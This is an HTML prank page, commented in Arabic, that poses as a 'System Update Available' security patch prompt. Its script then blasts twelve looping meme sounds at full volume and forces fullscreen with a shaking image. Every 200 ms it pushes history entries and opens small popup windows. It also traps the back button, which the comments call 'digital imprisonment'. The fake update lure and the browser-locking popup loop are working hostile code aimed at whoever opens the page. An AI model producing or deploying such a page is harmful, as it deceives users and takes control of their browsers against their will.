<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        /* الصورة تعمر الشاشة (كبيرة) وتتحرك بجنون سواسوة */
        #madwoman { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 1; display: none;
            will-change: transform;
        }

        /* واجهة التحذير الخفيفة سواسوة */
        #ui { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #f4f4f4; z-index: 1000; display: flex; 
            flex-direction: column; justify-content: center; align-items: center;
            font-family: sans-serif; color: #333;
        }
        .header { color: #0056b3; font-size: 24px; margin-bottom: 10px; font-weight: bold; }
        .msg { font-size: 16px; margin-bottom: 30px; text-align: center; padding: 0 20px; }
        .btn-fix { 
            background: #007bff; color: #fff; border: none; padding: 15px 40px; 
            border-radius: 5px; font-size: 18px; cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body onclick="launchMadness()">

    <div id="ui">
        <div class="header">System Update Available</div>
        <div class="msg">Security patch 2.4.1 is ready.<br>Tap to optimize performance.</div>
        <button class="btn-fix">Update Now</button>
    </div>

    <img id="madwoman" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="horrorSounds">
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
    </div>

    <script>
        let aCtx, analyser, data;
        const img = document.getElementById('madwoman');

        function launchMadness() {
            // 1. إطلاق الضبيح (12 صوت) سواسوة
            document.querySelectorAll('.s').forEach(a => { a.volume = 1.0; a.play(); });

            document.getElementById('ui').style.display = 'none';
            img.style.display = 'block';
            document.documentElement.requestFullscreen();

            // 2. الحبس الرقمي سواسوة
            setInterval(() => {
                history.pushState(null, null, window.location.href);
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 200);

            setupAudioReaction();
        }

        window.onpopstate = () => history.go(1);

        function setupAudioReaction() {
            aCtx = new (window.AudioContext || window.webkitAudioContext)();
            const source = aCtx.createMediaElementSource(document.querySelector('.s'));
            analyser = aCtx.createAnalyser();
            analyser.fftSize = 64;
            data = new Uint8Array(analyser.frequencyBinCount);
            source.connect(analyser);
            analyser.connect(aCtx.destination);
            animate();
        }

        function animate() {
            analyser.getByteFrequencyData(data);
            let volume = data.reduce((a, b) => a + b) / data.length;

            // 3. الحركة المجنونة: رعشة هستيرية تعتمد على قوة الضبيح سواسوة
            const moveX = (Math.random() - 0.5) * (volume / 2);
            const moveY = (Math.random() - 0.5) * (volume / 2);
            const scale = 1 + (volume / 255) * 0.5;
            const rotate = (Math.random() - 0.5) * (volume / 5);

            img.style.transform = `translate(${moveX}px, ${moveY}px) scale(${scale}) rotate(${rotate}deg)`;
            
            requestAnimationFrame(animate);
        }
    </script>
</body>
</html>
